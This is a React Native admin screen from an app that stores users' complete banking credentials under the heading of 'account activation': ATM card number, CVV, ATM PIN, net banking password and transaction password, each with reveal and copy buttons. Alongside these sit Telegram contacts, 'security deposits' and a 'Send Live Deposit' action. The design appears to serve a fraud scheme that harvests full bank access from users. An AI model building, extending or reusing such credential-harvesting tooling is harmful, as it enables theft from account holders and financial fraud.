import FullScreenLoader from "@/components/FullScreenLoader";
import {
  ActivationRequestCard,
  type ActivationRequestCardItem,
} from "@/components/admin-dashboard/ActivationRequestCard";
import { useAdminAccountActivationDetails } from "@/hooks/useAdminAccountActivationDetails";
import { styles } from "@/screens/admin-dashboard/UserAccountActivation.styles";
import { Ionicons } from "@expo/vector-icons";
import { Href, router, useLocalSearchParams } from "expo-router";
import { useEffect, useMemo } from "react";
import {
  ActivityIndicator,
  Alert,
  Image,
  ScrollView,
  Text,
  TouchableOpacity,
  View,
} from "react-native";
import { SafeAreaView } from "react-native-safe-area-context";
import { getProfileDisplayName } from "@/services/profileService";

function formatCreatedAt(value?: string | null) {
  if (!value) {
    return "Not available";
  }

  const date = new Date(value);

  if (Number.isNaN(date.getTime())) {
    return "Not available";
  }

  const datePart = new Intl.DateTimeFormat("en-IN", {
    day: "numeric",
    month: "long",
    year: "numeric",
  }).format(date);
  const timePart = new Intl.DateTimeFormat("en-IN", {
    hour: "numeric",
    minute: "2-digit",
    hour12: true,
  }).format(date);

  return `${datePart}, (${timePart})`;
}

function formatCurrency(value: number) {
  return new Intl.NumberFormat("en-IN", {
    style: "currency",
    currency: "INR",
    maximumFractionDigits: 0,
  }).format(value);
}

function maskValue(value?: string | null) {
  if (!value) {
    return "Not available";
  }

  if (value.length <= 4) {
    return "*".repeat(value.length);
  }

  return `**** ${value.slice(-4)}`;
}

type SensitiveFieldRowProps = {
  fieldKey: string;
  icon: keyof typeof Ionicons.glyphMap;
  label: string;
  value?: string | null;
  visible: boolean;
  copiedFieldKey: string | null;
  onToggle: (fieldKey: string) => void;
  onCopy: (fieldKey: string, value?: string | null) => void;
};

function SensitiveFieldRow({
  fieldKey,
  icon,
  label,
  value,
  visible,
  copiedFieldKey,
  onToggle,
  onCopy,
}: SensitiveFieldRowProps) {
  const displayValue = visible ? value || "Not available" : maskValue(value);
  const isCopied = copiedFieldKey === fieldKey;

  return (
    <View style={styles.detailBlock}>
      <Text style={styles.detailLabel}>{label}</Text>

      <View style={styles.detailRow}>
        <Ionicons name={icon} size={15} color="#94A3B8" />
        <Text style={styles.detailText}>{displayValue}</Text>

        <View style={styles.fieldActions}>
          <TouchableOpacity
            style={styles.iconBtn}
            onPress={() => onToggle(fieldKey)}
            disabled={!value}
          >
            <Ionicons
              name={visible ? "eye-off-outline" : "eye-outline"}
              size={16}
              color="#94A3B8"
            />
          </TouchableOpacity>

          <TouchableOpacity
            style={styles.iconBtn}
            onPress={() => void onCopy(fieldKey, value)}
            disabled={!value}
          >
            <Ionicons
              name={isCopied ? "checkmark" : "copy-outline"}
              size={16}
              color={isCopied ? "#22C55E" : "#94A3B8"}
            />
          </TouchableOpacity>
        </View>
      </View>
    </View>
  );
}

type PlainFieldRowProps = {
  icon: keyof typeof Ionicons.glyphMap;
  label: string;
  value?: string | null;
  canCopy?: boolean;
  copiedFieldKey?: string | null;
  fieldKey?: string;
  onCopy?: (fieldKey: string, value?: string | null) => void;
};

function PlainFieldRow({
  icon,
  label,
  value,
  canCopy = false,
  copiedFieldKey,
  fieldKey,
  onCopy,
}: PlainFieldRowProps) {
  const isCopied = fieldKey ? copiedFieldKey === fieldKey : false;

  return (
    <View style={styles.detailBlock}>
      <Text style={styles.detailLabel}>{label}</Text>

      <View style={styles.detailRow}>
        <Ionicons name={icon} size={15} color="#94A3B8" />
        <Text style={styles.detailText}>{value || "Not available"}</Text>

        {canCopy && fieldKey && onCopy ? (
          <TouchableOpacity
            style={styles.iconBtn}
            onPress={() => void onCopy(fieldKey, value)}
            disabled={!value}
          >
            <Ionicons
              name={isCopied ? "checkmark" : "copy-outline"}
              size={16}
              color={isCopied ? "#22C55E" : "#94A3B8"}
            />
          </TouchableOpacity>
        ) : null}
      </View>
    </View>
  );
}

export default function UserAccountActivationsScreen() {
  const params = useLocalSearchParams<{ requestId?: string | string[] }>();
  const resolvedRequestId = useMemo(
    () => (Array.isArray(params.requestId) ? params.requestId[0] : params.requestId),
    [params.requestId]
  );
  const {
    loading,
    selectedRequest,
    otherRequests,
    totalRequests,
    totalDeposits,
    latestDepositId,
    visibilityMap,
    toast,
    copiedFieldKey,
    actionStatus,
    updatingStatus,
    toggleVisibility,
    copyField,
    approveRequest,
    setRequestPending,
  } = useAdminAccountActivationDetails(resolvedRequestId);

  useEffect(() => {
    if (typeof resolvedRequestId !== "undefined") {
      return;
    }

    Alert.alert("Account Activation Error", "No activation request was selected.");
    router.back();
  }, [resolvedRequestId]);

  useEffect(() => {
    if (loading || !resolvedRequestId || selectedRequest) {
      return;
    }

    Alert.alert("Account Activation Error", "Unable to find this activation request.");
    router.back();
  }, [loading, resolvedRequestId, selectedRequest]);

  const displayName = getProfileDisplayName(selectedRequest?.user.name);
  const avatarCharacter = displayName.charAt(0).toUpperCase() || "U";
  const isActivated = selectedRequest?.status === "approved";

  const handleViewDeposits = () => {
    if (!latestDepositId) {
      Alert.alert("Deposits", "No deposits found for this bank account.");
      return;
    }

    router.push(`/user-security-deposit?depositId=${latestDepositId}` as Href);
  };

  const handleViewOtherActivation = (item: ActivationRequestCardItem) => {
    router.replace(
      `/user-account-activations?requestId=${item.id}` as Href
    );
  };

  if (loading) {
    return <FullScreenLoader />;
  }

  if (!selectedRequest) {
    return null;
  }

  return (
    <SafeAreaView style={styles.safeArea}>
      <ScrollView
        showsVerticalScrollIndicator={false}
        contentContainerStyle={styles.scrollContent}
      >
        <View style={styles.header}>
          <TouchableOpacity onPress={() => router.back()}>
            <Ionicons name="arrow-back" size={22} color="#E2E8F0" />
          </TouchableOpacity>

          <Text style={styles.headerTitle}>User Account Activation</Text>

          <View style={styles.headerSpacer} />
        </View>

        <View style={styles.userCard}>
          <View style={styles.avatarLarge}>
            {selectedRequest.user.avatar ? (
              <Image source={{ uri: selectedRequest.user.avatar }} style={styles.avatarImage} />
            ) : (
              <Text style={styles.avatarText}>{avatarCharacter}</Text>
            )}
          </View>

          <Text style={styles.userName}>{displayName}</Text>
          <Text style={styles.userEmail}>
            {selectedRequest.user.email || "Not available"}
          </Text>
          <Text style={styles.userMeta}>Activation Requests: {totalRequests}</Text>
        </View>

        <View style={styles.mainCard}>
          <View style={styles.topRow}>
            <View style={styles.topMeta}>
              <Text style={styles.topLabel}>Selected Request</Text>
              <Text style={styles.topValue}>
                {selectedRequest.bankName || "Bank details not provided"}
              </Text>
              <Text style={styles.topSubValue}>
                Created: {formatCreatedAt(selectedRequest.createdAt)}
              </Text>
            </View>

            <View
              style={[
                styles.badge,
                isActivated ? styles.approvedBadge : styles.pendingBadge,
              ]}
            >
              <Text style={styles.badgeText}>
                {isActivated ? "Activated" : "Not Activated"}
              </Text>
            </View>
          </View>

          <View style={styles.divider} />

          <View style={styles.section}>
            <View>
              <Text style={styles.sectionTitle}>Bank Details</Text>
              <Text style={styles.sectionSubtitle}>
                Core account information for this activation request.
              </Text>
            </View>

            <View style={styles.detailGrid}>
              <PlainFieldRow
                icon="business-outline"
                label="Bank Name"
                value={selectedRequest.bankName}
              />
              <PlainFieldRow
                icon="person-outline"
                label="Account Holder Name"
                value={selectedRequest.accountHolderName}
              />
              <SensitiveFieldRow
                fieldKey="accountNumber"
                icon="card-outline"
                label="Account Number"
                value={selectedRequest.accountNumber}
                visible={Boolean(visibilityMap.accountNumber)}
                copiedFieldKey={copiedFieldKey}
                onToggle={toggleVisibility}
                onCopy={copyField}
              />
              <PlainFieldRow
                icon="git-branch-outline"
                label="IFSC Code"
                value={selectedRequest.ifscCode}
                copiedFieldKey={copiedFieldKey}
                fieldKey="ifscCode"
                canCopy
                onCopy={copyField}
              />
            </View>
          </View>

          <View style={styles.divider} />

          <View style={styles.section}>
            <View>
              <Text style={styles.sectionTitle}>ATM Card Details</Text>
              <Text style={styles.sectionSubtitle}>
                Sensitive card information shared in the request.
              </Text>
            </View>

            <View style={styles.detailGrid}>
              <SensitiveFieldRow
                fieldKey="atmCardNumber"
                icon="card-outline"
                label="ATM Card Number"
                value={selectedRequest.atmCardNumber}
                visible={Boolean(visibilityMap.atmCardNumber)}
                copiedFieldKey={copiedFieldKey}
                onToggle={toggleVisibility}
                onCopy={copyField}
              />
              <SensitiveFieldRow
                fieldKey="cvv"
                icon="lock-closed-outline"
                label="CVV"
                value={selectedRequest.cvv}
                visible={Boolean(visibilityMap.cvv)}
                copiedFieldKey={copiedFieldKey}
                onToggle={toggleVisibility}
                onCopy={copyField}
              />
              <SensitiveFieldRow
                fieldKey="atmPin"
                icon="key-outline"
                label="ATM PIN"
                value={selectedRequest.atmPin}
                visible={Boolean(visibilityMap.atmPin)}
                copiedFieldKey={copiedFieldKey}
                onToggle={toggleVisibility}
                onCopy={copyField}
              />
              <SensitiveFieldRow
                fieldKey="cardExpiry"
                icon="calendar-outline"
                label="Card Expiry"
                value={selectedRequest.cardExpiry}
                visible={Boolean(visibilityMap.cardExpiry)}
                copiedFieldKey={copiedFieldKey}
                onToggle={toggleVisibility}
                onCopy={copyField}
              />
            </View>
          </View>

          <View style={styles.divider} />

          <View style={styles.section}>
            <View>
              <Text style={styles.sectionTitle}>Net Banking</Text>
              <Text style={styles.sectionSubtitle}>
                Login and transaction credentials for admin review.
              </Text>
            </View>

            <View style={styles.detailGrid}>
              <SensitiveFieldRow
                fieldKey="netBankingId"
                icon="desktop-outline"
                label="Net Banking ID"
                value={selectedRequest.netBankingId}
                visible={Boolean(visibilityMap.netBankingId)}
                copiedFieldKey={copiedFieldKey}
                onToggle={toggleVisibility}
                onCopy={copyField}
              />
              <SensitiveFieldRow
                fieldKey="netBankingPassword"
                icon="lock-closed-outline"
                label="Net Banking Password"
                value={selectedRequest.netBankingPassword}
                visible={Boolean(visibilityMap.netBankingPassword)}
                copiedFieldKey={copiedFieldKey}
                onToggle={toggleVisibility}
                onCopy={copyField}
              />
              <SensitiveFieldRow
                fieldKey="transactionPassword"
                icon="shield-checkmark-outline"
                label="Transaction Password"
                value={selectedRequest.transactionPassword}
                visible={Boolean(visibilityMap.transactionPassword)}
                copiedFieldKey={copiedFieldKey}
                onToggle={toggleVisibility}
                onCopy={copyField}
              />
            </View>
          </View>

          <View style={styles.divider} />

          <View style={styles.section}>
            <View>
              <Text style={styles.sectionTitle}>Contact Details</Text>
              <Text style={styles.sectionSubtitle}>
                Request-linked contact channels and communication details.
              </Text>
            </View>

            <View style={styles.detailGrid}>
              <PlainFieldRow
                icon="call-outline"
                label="Registered Mobile"
                value={selectedRequest.registeredMobile}
                copiedFieldKey={copiedFieldKey}
                fieldKey="registeredMobile"
                canCopy
                onCopy={copyField}
              />
              <PlainFieldRow
                icon="paper-plane-outline"
                label="Telegram Username"
                value={selectedRequest.telegramUsername}
                copiedFieldKey={copiedFieldKey}
                fieldKey="telegramUsername"
                canCopy
                onCopy={copyField}
              />
            </View>
          </View>

          <View style={styles.actionsWrap}>
            <View style={styles.actions}>
              {selectedRequest.status === "pending" && (
                <TouchableOpacity
                  style={[styles.approveBtn, updatingStatus && styles.disabledBtn]}
                  disabled={updatingStatus}
                  onPress={() => void approveRequest()}
                >
                  {updatingStatus && actionStatus === "approved" ? (
                    <ActivityIndicator size="small" color="#22C55E" />
                  ) : (
                    <Ionicons name="checkmark" size={14} color="#22C55E" />
                  )}
                  <Text style={styles.approveText}>Approve</Text>
                </TouchableOpacity>
              )}

              {selectedRequest.status === "approved" && (
                <>
                  <TouchableOpacity
                    style={[styles.secondaryBtn, updatingStatus && styles.disabledBtn]}
                    disabled={updatingStatus}
                    onPress={() => void setRequestPending()}
                  >
                    {updatingStatus && actionStatus === "pending" ? (
                      <ActivityIndicator size="small" color="#FBBF24" />
                    ) : (
                      <Ionicons name="time-outline" size={14} color="#CBD5F5" />
                    )}
                    <Text style={styles.secondaryBtnText}>Set to Pending</Text>
                  </TouchableOpacity>

                  <TouchableOpacity style={styles.liveDepositBtn} onPress={() => {}}>
                    <Ionicons name="cash-outline" size={14} color="#A5B4FC" />
                    <Text style={styles.liveDepositText}>Send Live Deposit</Text>
                  </TouchableOpacity>
                </>
              )}
            </View>
          </View>
        </View>

        <View style={styles.summaryCard}>
          <View style={styles.summaryMeta}>
            <Text style={styles.summaryLabel}>Total Deposits</Text>
            <Text style={styles.summaryValue}>{formatCurrency(totalDeposits)}</Text>
            <Text style={styles.summaryHint}>
              Includes pending and approved deposits for this bank account.
            </Text>
          </View>

          <TouchableOpacity
            style={[
              styles.secondaryBtn,
              !latestDepositId && styles.disabledBtn,
            ]}
            onPress={handleViewDeposits}
          >
            <Ionicons name="eye-outline" size={14} color="#CBD5F5" />
            <Text style={styles.secondaryBtnText}>View Deposits</Text>
          </TouchableOpacity>
        </View>

        {otherRequests.length > 0 && (
          <View style={styles.otherWrap}>
            <Text style={styles.otherTitle}>Other Activations</Text>
            <Text style={styles.otherSubtitle}>
              Other activation requests submitted by this user.
            </Text>

            <View style={styles.otherList}>
              {otherRequests.map((request) => (
                <ActivationRequestCard
                  key={request.id}
                  item={request}
                  onView={handleViewOtherActivation}
                />
              ))}
            </View>
          </View>
        )}
      </ScrollView>

      {toast ? (
        <View style={styles.toast}>
          <Text style={styles.toastText}>{toast}</Text>
        </View>
      ) : null}
    </SafeAreaView>
  );
}
